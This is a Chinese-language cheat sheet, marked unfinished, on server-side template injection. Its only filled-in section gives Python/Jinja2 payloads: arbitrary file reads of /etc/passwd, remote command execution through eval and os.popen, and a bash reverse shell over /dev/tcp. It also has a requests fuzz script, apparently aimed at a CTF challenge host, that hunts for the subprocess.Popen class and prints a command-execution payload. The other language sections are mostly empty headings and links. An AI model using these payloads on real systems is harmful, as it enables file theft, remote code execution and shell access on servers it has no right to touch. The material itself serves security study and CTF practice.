# SSTI 模板注入漏洞（Todo）

## Python

任意文件读
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}
```

rce
```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
```


```python
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1') %}1{% endif %}
```

```python
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

``subprocess.Popen`` fuzz脚本

```python
import requests

url = "http://38ab3221-49f0-415f-98bc-65b4744640b8.node3.buuoj.cn/"

index = 0
for i in range(100, 1000):
    #print i
    payload = "{{''.__class__.__mro__[2].__subclasses__()[%d]}}" % (i)
    params = {
        "search": payload
    }
    #print(params)
    req = requests.get(url,params=params)
    #print(req.text)
    if "subprocess.Popen" in req.text:
        index = i
        break


print("index of subprocess.Popen:" + str(index))
print("payload:{{''.__class__.__mro__[2].__subclasses__()[%d]('ls',shell=True,stdout=-1).communicate()[0].strip()}}" % i)
```

### Flask/Jinja2

### Django

### Tornado

## Java

### JSP

### FreeMarker

### Velocity

## PHP

### Twig

### Smarty

参考资料:

https://www.jianshu.com/p/eb8d0137a7d3

### Blade

## Ruby

```
$~:is equivalent to ::last_match;

$&:contains the complete matched text;

$`:contains string before match;

$':contains string after match;

$1, $2 and so on contain text matching first, second, etc capture group;

$+:contains last capture group.
```

### ERB



## 参考资料

一篇文章带你理解漏洞之SSTI漏洞:

[https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E)


Templates Injections Payload:

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection